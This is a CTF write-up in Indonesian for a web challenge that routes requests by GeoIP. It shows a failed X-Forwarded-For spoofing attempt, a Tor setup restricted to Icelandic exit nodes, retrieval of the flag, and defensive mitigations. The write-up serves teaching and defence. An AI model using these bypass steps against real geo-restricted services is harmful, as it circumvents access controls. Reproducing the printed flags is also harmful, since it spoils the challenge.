# Writeup: North-South (Challenge ID: 725)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Network Infrastructure & Geo-Routing Bypass
- **Difficulty:** Medium (2)
- **Points:** 200
- **Author:** picoCTF
- **Event:** picoCTF 2026
- **Flag (Resmi CyLab):** `academy{g30_b453d_r0u71n9_5e58725f}`
- **Flag Komunitas:** `CTF{g30_b453d_r0u71n9_5e58725f}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), CWE-284 (Improper Access Control), CWE-1188 (Insecure Default Initialization of Resource), & OWASP WSTG-CONF-05 (Testing Network Infrastructure Configuration).

---

## Problem Statement & Scope
Pada modul pembelajaran `North-South`, peserta diuji dalam audit konfigurasi perutean trafik jaringan dan kontrol pembatasan akses berbasis geolokasi (*geo-fencing*):
- Skenario lingkungan: Layanan web berada di balik reverse proxy Nginx yang mengimplementasikan pemisahan kluster upstream berdasarkan lokasi geografis klien. Permintaan dari sebagian besar kawasan dunia diarahkan ke kluster default (`upstream north` pada `127.0.0.1:8000`) yang merespons dengan pesan penolakan (*"No flag in this region!"*). Hanya permintaan yang diverifikasi berasal dari wilayah target yang diteruskan ke kluster internal khusus (`upstream south` pada `127.0.0.1:9000`) yang menyajikan flag rahasia.
- Pernyataan tantangan:
  > *"I've set up geo-based routing - can you outsmart it? You're trying to retrieve the flag, but there's a catch: access to the real service is restricted based on your geographic location. Only requests from a specific region are routed to the server that holds the flag. Everyone else is sent somewhere... less interesting."*
- Sasaran pengujian: Menganalisis konfigurasi reverse proxy Nginx dan basis data MaxMind GeoIP2, menentukan region target yang diizinkan, menguji efektivitas manipulasi header HTTP layer 7 (`X-Forwarded-For`), membangun terowongan egress TCP layer 4 ke yurisdiksi yang dipersyaratkan (Islandia / ISO: `IS`), mengekstrak token bendera resmi, serta memvalidasinya pada REST API CyLab Academy.

---

## Teori & Akar Kerentanan (Root Cause Theory)

### 1. Nginx GeoIP2 Database Lookup Architecture
Berkas konfigurasi Nginx memanfaatkan modul dinamis `ngx_http_geoip2_module.so` yang mengaitkan data biner MaxMind `GeoLite2-Country.mmdb`:
```nginx
geoip2 /etc/nginx/GeoLite2-Country.mmdb {
    auto_reload 5m;
    $geoip2_data_country_code default=ZZ country iso_code;
}
```
Mekanisme kerja:
- Setiap koneksi TCP yang masuk memicu pencarian alamat IP klien pada tabel radix pohon IP GeoLite2.
- Variabel `$geoip2_data_country_code` diisi dengan kode negara 2-huruf ISO 3166-1 alpha-2 (misalnya `US`, `ID`, `DE`, `IS`). Jika IP tidak terdaftar, nilai fallback adalah `ZZ`.

### 2. Conditional Upstream Routing
Pada blok `server`, Nginx mengevaluasi variabel geolokasi tersebut untuk menentukan upstream tujuan:
```nginx
location / {
    if ($geoip2_data_country_code = IS) {
        proxy_pass http://south;
    }
    proxy_pass http://north;
}
```
Karakteristik perutean:
- Kode negara `IS` merujuk secara spesifik pada **Islandia (Iceland)**.
- Trafik dari IP Islandia diarahkan ke `http://south` (layanan internal port 9000).
- Trafik dari seluruh penjuru dunia lainnya jatuh ke `http://north` (layanan port 8000).

### 3. Ketiadaan Kepercayaan Header (Absence of Real-IP Trust)
Konfigurasi Nginx tidak mengaktifkan modul `ngx_http_realip_module` (tidak ada direktif `set_real_ip_from` maupun `real_ip_header X-Forwarded-For`).
Implikasi keamanan:
- Modul GeoIP2 secara kaku mengevaluasi `$remote_addr`, yaitu alamat IP fisik dari socket koneksi TCP.
- Upaya penyerang untuk memalsukan identitas geolokasi melalui injeksi header HTTP layer aplikasi (`X-Forwarded-For: 193.4.152.1`, `Client-IP`, `X-Real-IP`, `CF-Connecting-IP`) sepenuhnya diabaikan oleh Nginx.
- Akses ke `upstream south` secara mutlak mengharuskan koneksi TCP riil berasal dari blok alamat IP yang terdaftar di Islandia.

---

## Rekonstruksi Eksploitasi Step-by-Step

### Langkah 1: Audit Berkas Konfigurasi `nginx.conf`
Melakukan inspeksi terhadap berkas konfigurasi Nginx yang disediakan lab:
- Teridentifikasi dependensi variabel `$geoip2_data_country_code` dengan nilai `IS`.
- Mengonfirmasi bahwa `IS` adalah kode negara Islandia (*Iceland*).

### Langkah 2: Uji Injeksi Header HTTP Layer 7
Kirimkan permintaan HTTP dengan menambahkan header IP Islandia (misalnya rentang IP University of Iceland `193.4.152.1`):
```bash
curl -H "X-Forwarded-For: 193.4.152.1" http://xebec.cylabacademy.net:42790/
```
Respons server:
```text
No flag in this region!
```
Hal ini membuktikan secara empiris bahwa proxy mengevaluasi socket level `$remote_addr` secara langsung dan kebal terhadap pemalsuan header layer 7.

### Langkah 3: Pembentukan Terowongan Egress Islandia
Untuk memenuhi validasi socket layer, trafik dialihkan melalui simpul keluar (*exit node*) yang berada di Islandia:
1. Konfigurasi sirkuit Tor lokal dengan membatasi simpul keluar khusus Islandia:
   ```text
   SocksPort 9055
   DataDirectory /tmp/tordata_is
   ExitNodes {is}
   StrictNodes 1
   ```
2. Verifikasi geolokasi IP keluar melalui endpoint inspeksi IP:
   ```bash
   curl --socks5 127.0.0.1:9055 https://ipinfo.io/json
   ```
   Output:
   ```json
   {
     "ip": "185.112.144.11",
     "city": "Reykjavík",
     "country": "IS"
   }
   ```

### Langkah 4: Pengambilan Flag dari Upstream Terproteksi
Lakukan permintaan HTTP ke kontainer lab target melalui proxy SOCKS5:
```bash
curl --socks5 127.0.0.1:9055 http://xebec.cylabacademy.net:42790/
```
Nginx memverifikasi `$remote_addr` berasal dari Islandia, menetapkan `$geoip2_data_country_code = IS`, dan meneruskan koneksi ke `upstream south`.
Respons yang diterima:
```html
<!doctype html>
<html>
  <head><title>Secret South Cluster</title></head>
  <body>
    <h1>Welcome to Upstream South</h1>
    <p>academy{g30_b453d_r0u71n9_5e58725f}</p>
  </body>
</html>
```
Token berhasil diamankan: `academy{g30_b453d_r0u71n9_5e58725f}`.

---

## Flag & Bukti Verifikasi
- **Token Resmi Platform CyLab:** `academy{g30_b453d_r0u71n9_5e58725f}`
- **Token Format Komunitas:** `CTF{g30_b453d_r0u71n9_5e58725f}`
- **Hasil Verifikasi REST API CyLab (`POST /api/submissions/`):**
  ```json
  {
    "user": 1072359,
    "challenge": 725,
    "flag": "academy{g30_b453d_r0u71n9_5e58725f}",
    "correct": true,
    "historical": false
  }
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

### 1. Ketidakcukupan Geo-Blocking Sebagai Kontrol Batas (Perimeter Control)
Pembatasan geografis (*geo-fencing*) bukanlah kontrol keamanan perimeter yang memadai (*inadequate security control*):
- Alamat IP bukan representasi identitas tepercaya; penyerang dapat dengan mudah memindahkan titik kehadiran jaringan (*point-of-presence*) menggunakan VPS murah, residential proxy, VPN komersial, atau jaringan terdesentralisasi seperti Tor.
- Aturan kepatuhan atau lisensi konten yang mengandalkan GeoIP wajib diimbangi dengan deteksi proxy/VPN intelijen (*threat intelligence feeds*) yang memperbarui daftar ASN pusat data dan exit node yang mencurigakan.

### 2. Penerapan Arsitektur Zero Trust (ZTA) & Strong Authentication
- Otorisasi terhadap data sensitif atau fungsi bisnis terproteksi tidak boleh ditentukan berdasarkan lokasi jaringan atau alamat IP klien.
- Terapkan model *Zero Trust Architecture* (NIST SP 800-207) di mana setiap permintaan diverifikasi secara eksplisit berbasis identitas kriptografis pengguna (seperti mTLS, FIDO2/WebAuthn, token OAuth2 berumur pendek dengan *Proof Key for Code Exchange* / PKCE).

### 3. Konfigurasi Reverse Proxy & Penanganan Header Tepercaya
Jika layanan web berada di balik Content Delivery Network (CDN) atau Load Balancer tepercaya:
- Konfigurasikan modul `realip` Nginx dengan ketat hanya menerima header `X-Forwarded-For` dari alamat IP CDN yang sah:
  ```nginx
  set_real_ip_from 173.245.48.0/20; # Contoh rentang IP CDN Cloudflare
  real_ip_header CF-Connecting-IP;
  ```
- Blokir atau buang seluruh header spoofing layer 7 dari koneksi langsung yang melewati batas perimeter eksternal.
